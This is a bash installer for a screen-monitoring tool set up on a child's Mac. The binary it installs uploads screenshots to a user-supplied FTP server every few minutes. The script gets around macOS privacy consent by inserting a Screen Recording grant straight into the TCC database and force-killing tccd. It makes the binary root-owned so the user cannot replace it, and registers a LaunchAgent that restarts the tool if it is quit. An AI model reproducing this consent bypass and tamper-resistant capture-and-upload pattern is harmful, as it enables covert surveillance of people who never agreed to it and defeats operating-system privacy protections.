#!/bin/bash
# IcyScreen installer — run this once on the child's Mac (requires admin password).
set -e

BINARY_NAME="IcyScreenMac"
INSTALL_PATH="/usr/local/bin/icyscreen"
AGENT_LABEL="com.icyscreen.agent"
AGENT_PLIST="$HOME/Library/LaunchAgents/${AGENT_LABEL}.plist"
CONFIG_DIR="$HOME/.icyscreen"
CONFIG_FILE="$CONFIG_DIR/config.json"
TCC_DB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"

echo "========================================"
echo "  IcyScreen Installer"
echo "========================================"
echo ""

# ── Prerequisites ──────────────────────────────────────────────────────────────
if ! command -v swift &>/dev/null; then
    echo "ERROR: Swift not found."
    echo "Install Xcode Command Line Tools first:  xcode-select --install"
    exit 1
fi

# ── Build ──────────────────────────────────────────────────────────────────────
echo "Building release binary..."
swift build -c release 2>&1

BUILD_OUTPUT=".build/release/$BINARY_NAME"
if [ ! -f "$BUILD_OUTPUT" ]; then
    echo "ERROR: Build failed — binary not found at $BUILD_OUTPUT"
    exit 1
fi
echo "Build succeeded."
echo ""

# ── Install binary ─────────────────────────────────────────────────────────────
echo "Installing binary to $INSTALL_PATH (requires admin password)..."
sudo cp "$BUILD_OUTPUT" "$INSTALL_PATH"
sudo chmod 755 "$INSTALL_PATH"
sudo chown root:wheel "$INSTALL_PATH"   # standard user cannot replace it

# Ad-hoc sign so macOS tracks this binary properly in TCC
codesign -s - --force "$INSTALL_PATH" 2>/dev/null && echo "Binary signed (ad-hoc)." || true
echo ""

# ── FTP configuration ──────────────────────────────────────────────────────────
mkdir -p "$CONFIG_DIR"

if [ ! -f "$CONFIG_FILE" ]; then
    echo "========================================"
    echo "  FTP Server Configuration"
    echo "========================================"
    read -r -p "FTP server IP or hostname:          " FTP_HOST
    read -r -p "FTP username:                       " FTP_USER
    read -r -s -p "FTP password:                       " FTP_PASS
    echo ""
    read -r -p "Remote folder path [/screenshots]:  " FTP_PATH
    FTP_PATH="${FTP_PATH:-/screenshots}"
    read -r -p "Capture interval in minutes [2]:    " INTERVAL
    INTERVAL="${INTERVAL:-2}"

    if ! [[ "$INTERVAL" =~ ^[0-9]+$ ]]; then
        echo "Invalid interval — defaulting to 2"
        INTERVAL=2
    fi

    cat > "$CONFIG_FILE" << JSONEOF
{
    "intervalMinutes": $INTERVAL,
    "ftpHost": "$FTP_HOST",
    "ftpUsername": "$FTP_USER",
    "ftpPassword": "$FTP_PASS",
    "ftpRemotePath": "$FTP_PATH"
}
JSONEOF
    chmod 600 "$CONFIG_FILE"
    echo "Config saved to $CONFIG_FILE"
    echo ""
fi

# ── Screen Recording permission via TCC database ───────────────────────────────
echo "Granting Screen Recording permission..."
TCC_GRANTED=false

if [ -f "$TCC_DB" ]; then
    if sudo sqlite3 "$TCC_DB" \
        "INSERT OR REPLACE INTO access \
         (service,client,client_type,auth_value,auth_reason,auth_version,\
          csreq,policy_id,indirect_object_identifier_type,\
          indirect_object_identifier,indirect_object_code_identity,flags,last_modified) \
         VALUES ('kTCCServiceScreenCapture','$INSTALL_PATH',1,2,4,1,\
                 NULL,NULL,0,'UNUSED',NULL,0,\
                 CAST(strftime('%s','now') AS INTEGER));" 2>/dev/null; then
        # Kill TCC daemon so it picks up the new entry immediately
        sudo pkill -9 tccd 2>/dev/null || true
        sleep 1
        echo "Screen Recording permission granted automatically via TCC database."
        TCC_GRANTED=true
    else
        echo "TCC database write blocked (normal on macOS 14+)."
    fi
fi

# ── LaunchAgent ────────────────────────────────────────────────────────────────
mkdir -p "$HOME/Library/LaunchAgents"

sed "s|INSTALL_PATH_PLACEHOLDER|$INSTALL_PATH|g" \
    "$(dirname "$0")/com.icyscreen.agent.plist" > "$AGENT_PLIST"

launchctl unload "$AGENT_PLIST" 2>/dev/null || true
launchctl load -w "$AGENT_PLIST"

echo ""
echo "========================================"
echo "  Installation Complete"
echo "========================================"
echo ""

if [ "$TCC_GRANTED" = false ]; then
    echo "ACTION REQUIRED — Screen Recording permission:"
    echo ""
    echo "  The app has already started and will open System Settings"
    echo "  automatically to the Screen Recording page."
    echo ""
    echo "  Just toggle the switch next to 'icyscreen' to ON."
    echo "  No navigation needed — the page opens by itself."
    echo ""
else
    echo "Screen Recording permission: granted automatically."
    echo ""
fi

echo "  Logs:    /tmp/icyscreen.log"
echo "  Config:  $CONFIG_FILE"
echo ""
echo "IcyScreen is running and auto-starts on every login."
echo "If force-quit, launchd restarts it within 10 seconds."
